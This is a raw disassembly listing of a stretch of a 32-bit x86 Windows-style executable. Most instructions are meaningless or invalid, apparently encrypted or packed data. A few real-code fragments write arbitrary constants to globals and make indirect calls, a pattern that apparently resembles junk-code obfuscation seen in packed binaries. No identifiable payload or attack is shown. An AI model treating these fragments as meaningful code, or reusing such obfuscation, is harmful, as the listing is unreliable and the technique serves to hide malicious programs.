  40a4fb:	cmp    DWORD PTR [ebp-0x4bf7795d],eax
  40a501:	(bad)  
  40a502:	mov    al,ds:0xe398d08e
  40a507:	adc    al,0x20
  40a509:	sub    BYTE PTR [ebx-0x44],0xd0
  40a50d:	add    al,0x9c
  40a50f:	mov    edx,0xf37539bd
  40a514:	out    0xef,eax
  40a516:	data16 xor al,0xe9
  40a519:	ficom  DWORD PTR [ebp+0x53]
  40a51c:	scas   al,BYTE PTR es:[edi]
  40a51d:	lods   eax,DWORD PTR ds:[esi]
  40a51e:	xchg   ecx,eax
  40a51f:	jl     0x40a562
  40a521:	and    BYTE PTR [ebp+0x48],ah
  40a524:	jge    0x40a4a8
  40a526:	inc    esi
  40a527:	pushf  
  40a528:	push   esp
  40a529:	(bad)  
  40a52a:	sbb    DWORD PTR [edi],eax
  40a52c:	in     al,0xc7
  40a52e:	fldl2e 
  40a530:	hlt    
  40a531:	fild   QWORD PTR [ecx-0x2]
  40a534:	mov    esp,DWORD PTR [ebp-0x30]
  40a537:	and    DWORD PTR [ecx],ebp
  40a539:	les    eax,FWORD PTR [edx+0x2e052e3f]
  40a53f:	mov    cl,0x81
  40a541:	cmp    eax,0x10c9a563
  40a546:	xor    eax,esi
  40a548:	loopne 0x40a53c
  40a54a:	outs   dx,DWORD PTR ds:[esi]
  40a54b:	xor    ch,0xad
  40a54e:	loop   0x40a554
  40a550:	ins    DWORD PTR es:[edi],dx
  40a551:	push   eax
  40a552:	call   0x6e41a63
  40a557:	repz shl DWORD PTR [esi-0x7cc02b4c],0x17
  40a55f:	pop    ds
  40a560:	pushf  
  40a561:	sub    esi,DWORD PTR [ebx]
  40a563:	xor    bl,dh
  40a565:	loope  0x40a5e5
  40a567:	stc    
  40a568:	or     eax,0x5242a14d
  40a56d:	cmp    eax,esp
  40a56f:	inc    edx
  40a570:	adc    bl,BYTE PTR [eax+edi*8]
  40a573:	xor    bl,BYTE PTR [eax-0x31]
  40a576:	sub    DWORD PTR [ecx],0xffffff91
  40a579:	jge    0x40a514
  40a57b:	mov    al,0x5f
  40a57d:	in     eax,0x7b
  40a57f:	cwde   
  40a580:	jae    0x40a5a8
  40a582:	bnd jae 0x40a597
  40a585:	retf   0x5a06
  40a588:	push   ebp
  40a589:	(bad)  
  40a58a:	sbb    eax,0xfa7ebfca
  40a58f:	test   eax,0xf82bf7ba
  40a594:	in     al,dx
  40a595:	mul    DWORD PTR [eax]
  40a597:	and    edx,DWORD PTR [edx-0x38336a50]
  40a59d:	push   ss
  40a59e:	mov    esi,0x98ec7e28
  40a5a3:	out    dx,al
  40a5a4:	aad    0x5c
  40a5a6:	int3   
  40a5a7:	push   ebx
  40a5a8:	ss call 0x4e09:0x7b7fdfa5
  40a5b0:	add    BYTE PTR [ecx],dh
  40a5b2:	sub    eax,0xf9c9ee99
  40a5b7:	(bad)  
  40a5b8:	jbe    0x40a566
  40a5ba:	imul   edx,DWORD PTR [eax-0x66a185d1],0xf8f7b7e9
  40a5c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5c5:	xchg   BYTE PTR [ebx+ebx*4-0xc],ah
  40a5c9:	in     al,dx
  40a5ca:	outs   dx,BYTE PTR ds:[esi]
  40a5cb:	cdq    
  40a5cc:	pop    ds
  40a5cd:	mov    ds:0x2928bb64,eax
  40a5d2:	or     esi,DWORD PTR [ebx-0x43]
  40a5d5:	push   esp
  40a5d6:	push   esp
  40a5d7:	jmp    0x7aca:0x9cb36664
  40a5de:	sub    esp,esi
  40a5e0:	ror    ebx,cl
  40a5e2:	xor    eax,0x68c7df10
  40a5e7:	pop    edi
  40a5e8:	jl     0x40a598
  40a5ea:	shl    DWORD PTR [ecx],cl
  40a5ec:	mov    dh,BYTE PTR [ebp+eiz*1-0x2]
  40a5f0:	lds    edx,FWORD PTR [ecx]
  40a5f2:	jae    0x40a61c
  40a5f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5f5:	pop    edx
  40a5f6:	retf   0x9665
  40a5f9:	(bad)  
  40a5fa:	and    ecx,DWORD PTR [eax-0x3]
  40a5fd:	xchg   edi,eax
  40a5fe:	arpl   WORD PTR [edi-0x26],sp
  40a601:	jo     0x40a641
  40a603:	mov    eax,0x287db49c
  40a608:	xchg   DWORD PTR [eax],esp
  40a60a:	call   0x8449:0x89f552b
  40a611:	daa    
  40a612:	push   ecx
  40a613:	adc    eax,0x1f2ecb07
  40a618:	lods   eax,DWORD PTR ds:[esi]
  40a619:	frndint 
  40a61b:	test   BYTE PTR [edx],0x73
  40a61e:	and    bh,BYTE PTR [edx+0x4fae2e8d]
  40a624:	or     eax,0x1c8d66fe
  40a629:	pop    ss
  40a62a:	and    BYTE PTR [edi+ebx*1+0x56],bh
  40a62e:	mov    ebx,0x9fece752
  40a633:	fcmovnb st,st(2)
  40a635:	cdq    
  40a636:	xor    ebp,ebp
  40a638:	adc    esi,DWORD PTR [eax-0x19d84c39]
  40a63e:	test   eax,0x9ea3b72c
  40a643:	xchg   edx,eax
  40a644:	jge    0x40a6b9
  40a646:	mov    WORD PTR [ebx+0x8c27e19],es
  40a64c:	add    esp,DWORD PTR [edx-0x21911bd1]
  40a652:	ins    BYTE PTR es:[edi],dx
  40a653:	inc    edx
  40a654:	inc    ebp
  40a655:	std    
  40a656:	out    dx,al
  40a657:	ret    
  40a658:	test   eax,0xeca300f0
  40a65d:	repnz out 0xf1,eax
  40a660:	push   ebp
  40a661:	pop    ebx
  40a662:	repz xor eax,0x8c1637d5
  40a668:	jo     0x40a671
  40a66a:	jle    0x40a645
  40a66c:	mov    ah,BYTE PTR [esi]
  40a66e:	push   esp
  40a670:	(bad)  
  40a671:	retf   0x352d
  40a674:	dec    ebx
  40a675:	xchg   edi,eax
  40a676:	int3   
  40a677:	ins    BYTE PTR es:[edi],dx
  40a678:	cmp    eax,0x4a6b114e
  40a67d:	je     0x40a6e7
  40a67f:	dec    esi
  40a680:	and    ch,ah
  40a682:	pop    eax
  40a683:	imul   ebp,esi,0xfffffff4
  40a686:	add    edi,esi
  40a688:	inc    eax
  40a689:	mov    cl,0xf0
  40a68b:	sar    BYTE PTR [esi+0x624b017d],1
  40a691:	cmc    
  40a692:	aad    0xf0
  40a694:	dec    edi
  40a695:	dec    ecx
  40a696:	pop    eax
  40a697:	sbb    edx,DWORD PTR [ecx+edi*1+0x6a]
  40a69b:	ret    0x89d9
  40a69e:	aaa    
  40a69f:	sar    DWORD PTR [ebx],0x2e
  40a6a2:	sahf   
  40a6a3:	loope  0x40a673
  40a6a5:	pop    es
  40a6a6:	lea    eax,[edx]
  40a6a8:	dec    esp
  40a6a9:	popa   
  40a6aa:	pop    edi
  40a6ab:	(bad)  
  40a6ac:	shl    BYTE PTR [edi],0x18
  40a6af:	xor    BYTE PTR [edx],ah
  40a6b1:	ds jmp 0x40a6ec
  40a6b4:	pop    ecx
  40a6b5:	xchg   esp,edi
  40a6b7:	adc    BYTE PTR [esi+0xf84a860],cl
  40a6bd:	jb     0x40a6c7
  40a6bf:	aas    
  40a6c0:	xchg   edx,eax
  40a6c1:	inc    edi
  40a6c2:	stc    
  40a6c3:	or     eax,0xbe3df851
  40a6c8:	cmp    DWORD PTR [edi-0x4564da4d],ecx
  40a6ce:	(bad)  
  40a6cf:	cmp    al,0xb4
  40a6d1:	xor    BYTE PTR [ecx-0x60],dh
  40a6d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6d5:	lods   al,BYTE PTR ds:[esi]
  40a6d6:	imul   esp,DWORD PTR [ecx+0x426b87ac],0x2
  40a6dd:	int3   
  40a6de:	add    eax,0x58f8fd8
  40a6e3:	fst    DWORD PTR [edi]
  40a6e5:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6e7:	out    dx,eax
  40a6e8:	and    dl,0x53
  40a6eb:	fwait
  40a6ec:	leave  
  40a6ed:	cmp    edi,eax
  40a6ef:	mov    DWORD PTR ds:0x43366b,0x5aa8
  40a6f9:	jne    0x40b4e6
  40a6ff:	adc    DWORD PTR ds:0x433657,0xbfa
  40a709:	push   DWORD PTR [ebp+0x8]
  40a70c:	add    DWORD PTR ds:0x4336e7,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433717
  40a72f:	or     DWORD PTR ds:0x433723,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433713,0x433607
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x4336af,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x433667,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x4336ef,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x4335ff,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x4336db
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43360b
  40a793:	sub    DWORD PTR ds:0x433623,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0xe5c4ec0c
  40a7ac:	test   eax,0x7eed16c7
  40a7b1:	jle    0x40a7eb
  40a7b3:	jl     0x40a833
  40a7b5:	jle    0x40a833
  40a7b7:	iret   
  40a7b8:	mov    BYTE PTR [ecx+0x3d],ah
  40a7bb:	cmp    esi,DWORD PTR [ecx+ebp*4+0x7437134d]
  40a7c2:	(bad)  
  40a7c3:	jmp    0x40a7a1
  40a7c5:	adc    al,0x25
  40a7c7:	jge    0x40a7c6
  40a7c9:	fidivr DWORD PTR [edx-0x5738a098]
  40a7cf:	(bad)  [si-0x4c]
  40a7d3:	das    
  40a7d4:	xchg   ecx,eax
  40a7d5:	push   ebp
  40a7d6:	xchg   esp,eax
  40a7d7:	and    eax,0xa8c5cdff
  40a7dc:	out    0xba,al
  40a7de:	adc    DWORD PTR [esi-0x3a],ebp
  40a7e1:	in     eax,dx
  40a7e2:	ffreep st(4)
  40a7e4:	leave  
  40a7e5:	adc    esp,ebx
  40a7e7:	add    BYTE PTR [edx],0xe0
  40a7ea:	ins    DWORD PTR es:[edi],dx
  40a7eb:	add    DWORD PTR [eax+0x44a29f94],0xffffffed
  40a7f2:	or     cl,BYTE PTR [edx]
  40a7f4:	push   0x2b
  40a7f6:	jbe    0x40a7a0
  40a7f8:	xchg   esi,eax
  40a7f9:	mov    ch,0x52
  40a7fb:	jo     0x40a854
  40a7fd:	nop
  40a7fe:	xchg   esi,eax
  40a7ff:	pop    ss
  40a800:	aad    0xe2
  40a802:	ror    DWORD PTR [edi],0x9c
  40a805:	add    eax,0xf2ec156d
  40a80a:	cwde   
  40a80b:	sbb    ebx,edi
  40a80d:	sbb    DWORD PTR ds:[esi+0x30],0xffffffff
  40a812:	jg     0x40a842
  40a814:	loop   0x40a860
  40a816:	sbb    bh,BYTE PTR [ebx]
  40a818:	fwait
  40a819:	loope  0x40a86c
  40a81b:	xchg   BYTE PTR [edx+0x3f5aa195],al
  40a821:	es jge 0x40a7fe
  40a824:	pop    edx
  40a825:	int3   
  40a826:	add    ebp,DWORD PTR [ecx-0x4a]
  40a829:	sub    esi,edx
  40a82b:	in     al,0x89
  40a82d:	repz pop ebx
  40a82f:	(bad)  
  40a830:	mov    ecx,0x70613d13
  40a835:	shr    eax,0xe2
  40a838:	jno    0x40a849
  40a83a:	aam    0x6d
  40a83c:	out    0x54,eax
  40a83e:	iret   
  40a83f:	mov    al,0xf1
  40a841:	cld    
  40a842:	sub    eax,0x65c4f78f
  40a847:	mov    ds,WORD PTR [eax]
  40a849:	cld    
  40a84a:	es mov ebx,0x302da301
  40a850:	bound  esi,QWORD PTR [ecx+0x1f]
  40a853:	les    ebx,FWORD PTR [ebx-0x6e]
  40a856:	jbe    0x40a8b2
  40a858:	das    
  40a859:	mov    fs,WORD PTR [edi-0x3b6dfccc]
  40a85f:	jge    0x40a803
  40a861:	pop    ecx
  40a862:	rdtsc  
  40a864:	out    0xf,al
  40a866:	inc    eax
  40a867:	jp     0x40a806
  40a869:	xchg   esp,eax
  40a86a:	(bad)  
  40a86b:	jnp    0x40a816
  40a86d:	sub    esi,edi
  40a86f:	xchg   esi,eax
  40a870:	into   
  40a871:	or     BYTE PTR [ebx],0xb6
  40a874:	out    0x4f,al
  40a876:	scas   al,BYTE PTR es:[edi]
  40a877:	sbb    edi,DWORD PTR ds:0xda0b7527
  40a87d:	sbb    al,0xca
  40a87f:	retf   
  40a880:	xor    al,0xe8
  40a882:	jl     0x40a8b2
  40a884:	xor    ecx,DWORD PTR [edx]
  40a886:	aas    
  40a887:	arpl   WORD PTR [edx],bx
  40a889:	(bad)  
  40a88a:	fidivr DWORD PTR [edx]
  40a88c:	jp     0x40a889
  40a88e:	leave  
  40a88f:	jns    0x40a87e
  40a891:	or     eax,0xa42ce274
  40a896:	mov    esp,0x9aa97591
  40a89b:	adc    dl,bl
  40a89d:	push   sp
  40a89f:	sbb    BYTE PTR [eax+0x26],al
  40a8a2:	push   es
  40a8a3:	mov    dl,0xe0
  40a8a5:	inc    DWORD PTR [edx]
  40a8a7:	sbb    al,BYTE PTR ds:0x2b8cf23c
  40a8ad:	(bad)  
  40a8ae:	push   ebx
  40a8af:	sbb    cl,cl
  40a8b1:	add    BYTE PTR [esi],0x62
  40a8b4:	es cld 
  40a8b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8b7:	into   
  40a8b8:	ret    0xcbe1
  40a8bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8bc:	ds mov dh,0x98
  40a8bf:	pop    ss
  40a8c0:	mov    edi,0xa0280cac
  40a8c5:	push   0x3729b7fd
  40a8ca:	dec    ebx
  40a8cb:	inc    ecx
  40a8cc:	mov    cl,0xda
  40a8ce:	push   esp
  40a8cf:	push   ds
  40a8d0:	scas   al,BYTE PTR es:[edi]
  40a8d1:	lock pop edx
  40a8d3:	fist   DWORD PTR [ebp-0x42b71a3d]
  40a8d9:	lods   eax,DWORD PTR ds:[esi]
  40a8da:	xor    eax,0x7130d221
  40a8df:	lahf   
  40a8e0:	sar    DWORD PTR [esi+0x761fcb75],0xe2
  40a8e7:	repnz or edx,edx
  40a8ea:	push   esp
  40a8eb:	shl    DWORD PTR [edx+0x7756974d],1
  40a8f1:	pop    ecx
  40a8f2:	mov    ebx,0x5bf35805
  40a8f7:	fcmovnbe st,st(3)
  40a8f9:	pop    esi
  40a8fa:	dec    edx
  40a8fb:	and    BYTE PTR [edi+0x6a57e2c0],ah
  40a901:	mov    dl,al
  40a903:	mov    edi,DWORD PTR [edi+0x63]
  40a906:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a907:	das    
  40a908:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a909:	aam    0x23
  40a90b:	pop    esi
  40a90c:	pop    edx
  40a90d:	sub    bl,al
  40a90f:	xchg   ebx,eax
  40a910:	jno    0x40a955
  40a912:	or     ebp,0x29
  40a915:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a916:	xchg   ebx,eax
  40a917:	js     0x40a941
  40a919:	sbb    ebx,ebx
  40a91b:	add    DWORD PTR ds:0x859f02fc,edx
  40a921:	imul   eax,edx,0x9b39634b
  40a927:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a928:	pop    esp
  40a929:	mov    ebx,DWORD PTR [esi-0x2c]
  40a92c:	cmc    
  40a92d:	stos   BYTE PTR es:[edi],al
  40a92e:	or     ch,BYTE PTR [esi-0x25c3174d]
  40a934:	hlt    
  40a935:	test   DWORD PTR [edx],ecx
  40a937:	dec    esp
  40a938:	adc    eax,0x69398f3e
  40a93d:	das    
  40a93e:	push   ss
  40a93f:	adc    eax,0x9256733
  40a944:	aas    
  40a945:	retf   0x29ad
  40a948:	xchg   edx,eax
  40a949:	ins    DWORD PTR es:[edi],dx
  40a94a:	shr    edi,0xce
  40a94d:	pop    edx
  40a94e:	(bad)  
  40a951:	sbb    BYTE PTR [ebx-0x3d],0x6c
  40a955:	or     BYTE PTR ss:[esi+0x5b1c6ffd],0xab
  40a95d:	jg     0x40a99f
  40a95f:	push   ebx
  40a960:	dec    ebx
  40a961:	cdq    
  40a962:	cmp    bh,BYTE PTR [edi-0x6beb9170]
  40a968:	mov    ebp,0xfa7374f6
  40a96d:	push   cs
  40a96e:	pop    es
  40a96f:	imul   edx,DWORD PTR [ecx-0x6a],0x5e3d762e
  40a976:	sub    bh,BYTE PTR [ebx+0x775569db]
  40a97c:	jle    0x40a93f
  40a97e:	pop    DWORD PTR [ebp+0x5b]
  40a981:	pusha  
  40a982:	std    
  40a983:	cmovle esi,DWORD PTR [eax+eax*8-0x479c93de]
  40a98b:	sbb    ebp,ecx
  40a98d:	(bad)  
  40a98f:	sub    eax,DWORD PTR [ecx]
  40a991:	cmp    DWORD PTR [eax-0x4ce7b97a],esp
  40a997:	sbb    dh,BYTE PTR [esp+esi*8+0x7a]
  40a99b:	daa    
  40a99c:	mov    eax,ds:0xb9396d6a
  40a9a1:	mov    esp,0xa02fca66
  40a9a6:	std    
  40a9a7:	in     al,0x89
  40a9a9:	jae    0x40a96d
  40a9ab:	xor    DWORD PTR [esi+eax*4-0x4],0x748c1982
  40a9b3:	sbb    edx,ecx
  40a9b5:	gs out 0x42,al
  40a9b8:	ficomp WORD PTR [esi-0x67]
  40a9bb:	push   0xd
  40a9bd:	dec    ebx
  40a9be:	push   0x6d
  40a9c0:	nop
  40a9c1:	ja     0x40a958
  40a9c3:	sar    DWORD PTR [ebx-0x45],cl
  40a9c6:	xor    BYTE PTR [esi+0xf],cl
  40a9c9:	mov    esi,0xe55d05bc
  40a9ce:	cmp    al,0x33
  40a9d0:	arpl   WORD PTR [ebp+0x3577ef65],ax
  40a9d6:	or     al,0xc0
  40a9d8:	push   eax
  40a9d9:	mov    al,0x89
  40a9db:	cdq    
  40a9dc:	sahf   
  40a9dd:	popa   
  40a9de:	lods   eax,DWORD PTR ds:[esi]
  40a9df:	or     ebx,eax
  40a9e1:	cmp    BYTE PTR [edx+0x5bfab134],cl
  40a9e7:	xchg   esp,eax
  40a9e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9e9:	xchg   edi,eax
  40a9ea:	cmp    eax,0x95722620
  40a9ef:	or     al,0x4e
  40a9f1:	mov    ebx,0xc6d28134
  40a9f6:	rol    DWORD PTR [ecx-0x1f07adb],0x89
  40a9fd:	inc    ebp
  40a9fe:	in     al,dx
  40a9ff:	mov    eax,DWORD PTR [ebp-0x4]
  40aa02:	xor    DWORD PTR ds:0x433617,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433717,0x4336e7
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x433667,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	lods   al,BYTE PTR ds:[esi]
  40aa35:	lock jnp 0x40aa84
  40aa38:	shr    bl,1
  40aa3a:	jle    0x40aaba
  40aa3c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40aa40:	(bad)  
  40aa42:	sub    ch,BYTE PTR [edx-0x12f23900]
  40aa48:	aam    0xda
  40aa4a:	push   0x3d86e22e
  40aa4f:	inc    edi
  40aa50:	mov    ah,0xf0
  40aa52:	(bad)  [esp+ebx*2+0x70]
  40aa56:	imul   ecx,DWORD PTR [ebx],0x1440c82d
  40aa5c:	mov    ch,0xa0
  40aa5e:	mov    ebx,0xd602c708
  40aa63:	cmp    dh,ch
  40aa65:	fwait
  40aa66:	sbb    esi,edx
  40aa68:	pop    esi
  40aa69:	bound  ebp,QWORD PTR [edi+0x67]
  40aa6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa6d:	add    dh,BYTE PTR [esi]
  40aa6f:	retf   0xb79a
  40aa72:	popa   
  40aa73:	inc    ecx
  40aa74:	push   0xffffffb6
  40aa76:	addr16 xchg ebp,eax
  40aa78:	add    eax,0x68a629dc
  40aa7d:	adc    al,BYTE PTR [esp+eax*4-0x5f]
  40aa81:	adc    ah,dh
  40aa83:	inc    esi
  40aa84:	xchg   ebp,eax
  40aa85:	mov    esi,DWORD PTR [ebx+eax*2]
  40aa88:	loopne 0x40aa38
  40aa8a:	add    eax,0x159fcf5a
  40aa8f:	ret    
  40aa90:	push   ds
  40aa91:	adc    BYTE PTR [ebx+eiz*4-0x7584b8c7],al
  40aa98:	push   ss
  40aa99:	std    
  40aa9a:	scas   al,BYTE PTR es:[edi]
  40aa9b:	dec    esi
  40aa9c:	add    dh,BYTE PTR [esi+0xaf05b0d]
  40aaa2:	hlt    
  40aaa3:	xchg   BYTE PTR [ecx-0x605394fe],dh
  40aaa9:	rcr    BYTE PTR [eax],1
  40aaab:	ss mov eax,esi
  40aaae:	stos   BYTE PTR es:[edi],al
  40aaaf:	add    ah,ah
  40aab1:	ret    0x6a62
  40aab4:	call   0x3b754362
  40aab9:	jmp    0x3a0c:0x36a20164
  40aac0:	and    al,0xd8
  40aac2:	jb     0x40aa6d
  40aac4:	xchg   ebx,eax
  40aac5:	fisttp QWORD PTR [ebx+0x4725ed5c]
  40aacb:	xor    BYTE PTR [ecx-0x47],dh
  40aace:	mov    ah,0xaa
  40aad0:	xor    ecx,DWORD PTR [eax+ecx*1+0xe3662ea]
  40aad7:	or     cl,BYTE PTR [eax]
  40aad9:	lods   al,BYTE PTR ds:[esi]
  40aada:	push   edx
  40aadb:	xchg   ebx,eax
  40aadc:	mul    cl
  40aade:	test   cl,al
  40aae0:	sbb    al,BYTE PTR [edx+0x7aea13ab]
  40aae6:	pop    ds
  40aae7:	push   ds
  40aae8:	adc    dh,BYTE PTR [ecx+eiz*8+0x5ffc51a4]
  40aaef:	push   es
  40aaf0:	mov    cl,0x91
  40aaf2:	scas   al,BYTE PTR es:[edi]
  40aaf3:	lods   eax,DWORD PTR ds:[esi]
  40aaf4:	sbb    edi,edx
  40aaf6:	pop    ds
  40aaf7:	push   ecx
  40aaf8:	sbb    edi,DWORD PTR [esi+ecx*8-0x35]
  40aafc:	es ds (bad) 
  40aaff:	mov    WORD PTR [esi],cs
  40ab01:	es jo  0x40aae9
  40ab04:	inc    eax
  40ab05:	lea    esp,[edx+0x6c]
  40ab08:	(bad)  [esi-0x6e32fc7]
  40ab0e:	sub    esi,ecx
  40ab10:	inc    eax
  40ab11:	out    0x78,eax
  40ab13:	and    ebx,ebp
  40ab15:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab17:	mov    ecx,ecx
  40ab19:	cdq    
  40ab1a:	push   ss
  40ab1b:	jecxz  0x40aaf7
  40ab1d:	fisttp QWORD PTR fs:[ebx]
  40ab20:	enter  0x1bd3,0x55
  40ab24:	or     ecx,DWORD PTR [edx]
  40ab26:	pop    edx
  40ab27:	test   eax,0xb40021d2
  40ab2c:	sbb    DWORD PTR [ebp+0x769d13d7],esi
  40ab32:	fwait
  40ab33:	inc    edx
  40ab34:	sub    BYTE PTR ds:0x79779604,dh
  40ab3a:	retf   0x887
  40ab3d:	mov    bh,0xb4
  40ab3f:	mov    esi,0x569cc4fa
  40ab44:	retf   0x2762
  40ab47:	mov    esp,0xafb97516
  40ab4c:	jae    0x40aad7
  40ab4e:	test   DWORD PTR [edx+0x41],ebp
  40ab51:	dec    eax
  40ab52:	gs dec edx
  40ab54:	push   0xffffff8a
  40ab56:	cmc    
  40ab57:	jb     0x40aba9
  40ab59:	loop   0x40aba2
  40ab5b:	aam    0x45
  40ab5d:	leave  
  40ab5e:	daa    
  40ab5f:	jmp    0x40abb9
  40ab61:	dec    edi
  40ab62:	and    eax,0x6171f23e
  40ab67:	xor    al,0xd9
  40ab69:	popf   
  40ab6a:	nop
  40ab6b:	fidivr WORD PTR [edi]
  40ab6d:	xchg   DWORD PTR [esi+0x4e],ebx
  40ab70:	inc    edi
  40ab71:	and    edi,DWORD PTR [edi]
  40ab73:	repz enter 0x8fcf,0xaa
  40ab78:	mov    ebx,0x5c409c7d
  40ab7d:	jne    0x40ab18
  40ab7f:	int3   
  40ab80:	xor    al,0x47
  40ab82:	in     al,0xcd
  40ab84:	imul   ebx,DWORD PTR [ebx-0x1e2d364a],0x45
  40ab8b:	push   ebx
  40ab8c:	sub    al,0xad
  40ab8e:	jno    0x40ab83
  40ab90:	mov    fs,WORD PTR [ebp-0x688dcc30]
  40ab96:	ds mov ch,0x4f
  40ab99:	adc    eax,0xfa0ae0e2
  40ab9e:	jb     0x40abe9
  40aba0:	mov    BYTE PTR [ebp+edx*4-0x23012fb2],bl
  40aba7:	or     ebx,DWORD PTR [ebx+0x12238e4a]
  40abad:	jg     0x40ab32
  40abaf:	dec    ebx
  40abb0:	push   ebp
  40abb1:	and    dl,dl
  40abb3:	dec    ecx
  40abb4:	xchg   DWORD PTR [ecx+0x61],ebx
  40abb7:	cmp    al,0xb2
  40abb9:	dec    esp
  40abba:	call   0xccad:0x91ea3546
  40abc1:	loope  0x40ac12
  40abc3:	dec    ebx
  40abc4:	es jecxz 0x40abea
  40abc7:	mov    BYTE PTR [edx+ecx*1],0x8c
  40abcb:	mov    ecx,0xecfded76
  40abd0:	fs xchg esp,eax
  40abd2:	enter  0x1e0a,0xf0
  40abd6:	mov    eax,0x816316f4
  40abdb:	adc    edx,esi
  40abdd:	or     eax,0x4670ac4e
  40abe2:	push   edi
  40abe3:	xchg   ebp,eax
  40abe4:	jno    0x40aba1
  40abe6:	(bad)  
  40abe8:	dec    ebx
  40abe9:	int3   
  40abea:	jns    0x40ac4b
  40abec:	push   ss
  40abed:	pusha  
  40abee:	ins    BYTE PTR es:[edi],dx
  40abef:	mov    BYTE PTR [esi-0x5243b856],bl
  40abf5:	gs cmp ebp,esi
  40abf8:	push   eax
  40abf9:	pop    edi
  40abfa:	je     0x40ac21
  40abfc:	inc    eax
  40abfd:	fwait
  40abfe:	es jno 0x40ac71
  40ac01:	xor    edi,ecx
  40ac03:	dec    esp
  40ac04:	aas    
  40ac05:	test   eax,0x1a6b93d7
  40ac0a:	lahf   
  40ac0b:	dec    edx
  40ac0c:	nop
  40ac0d:	or     al,0xe3
  40ac0f:	adc    DWORD PTR [edi],esi
  40ac11:	sub    al,BYTE PTR [edx+0x6e]
  40ac14:	dec    ebp
  40ac15:	cmp    BYTE PTR [ecx-0x75],ch
  40ac18:	push   eax
  40ac19:	int    0x10
  40ac1b:	stc    
  40ac1c:	mov    ?,WORD PTR [ecx-0x13ee32b0]
  40ac22:	mov    ah,0x4a
  40ac24:	scas   al,BYTE PTR es:[edi]
  40ac25:	das    
  40ac26:	lods   eax,DWORD PTR ds:[esi]
  40ac27:	(bad)  
  40ac29:	nop
  40ac2a:	xchg   BYTE PTR [ebx+eax*2],dh
  40ac2d:	mov    ebp,0xf977811a
  40ac32:	sbb    BYTE PTR [ecx+0x40],bh
  40ac35:	cmp    DWORD PTR [ebx+0x4f],edi
  40ac38:	xchg   esp,eax
  40ac39:	inc    edi
  40ac3a:	icebp  
  40ac3b:	dec    ecx
  40ac3c:	inc    esi
  40ac3d:	xor    al,0xb4
  40ac3f:	stos   BYTE PTR es:[edi],al
  40ac40:	repz pop ebp
  40ac42:	imul   ebx,DWORD PTR [esi+esi*2+0x20fbb2df],0x799770b3
  40ac4d:	jle    0x40acc6
  40ac4f:	pop    edx
  40ac50:	fidivr DWORD PTR [bp+di-0x10]
  40ac54:	outs   dx,BYTE PTR cs:[esi]
  40ac56:	push   0xffffffd4
  40ac58:	js     0x40acd6
  40ac5a:	bound  ebx,QWORD PTR [edx]
  40ac5c:	nop
  40ac5d:	test   eax,0x295938aa
  40ac62:	ss adc ecx,ebx
  40ac65:	push   ss
  40ac66:	push   cs
  40ac67:	mov    WORD PTR [eax],?
  40ac69:	repz test BYTE PTR [eax-0x13],ch
  40ac6d:	and    DWORD PTR [esi-0x19cd1e5b],edi
  40ac73:	les    esi,FWORD PTR [eax+0x50321292]
  40ac79:	sub    BYTE PTR [edi-0x7f2957f7],0xd5
  40ac80:	(bad)  
  40ac81:	xchg   ebp,eax
  40ac82:	imul   esp,DWORD PTR [ebp-0x20],0x28
  40ac86:	cmp    ecx,eax
  40ac88:	je     0x40b9ed
  40ac8e:	sbb    DWORD PTR ds:0x43366b,0x7413
  40ac98:	mov    eax,DWORD PTR [ebp-0x14]
  40ac9b:	and    DWORD PTR ds:0x4336ef,0x0
  40aca5:	xor    ecx,ecx
  40aca7:	or     ecx,DWORD PTR ds:0x4336ef
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x4336ef,ecx
  40acb4:	cmp    DWORD PTR ds:0x4336ef,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433788
  40acc6:	push   0x4337cc
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x4336ef,0x5
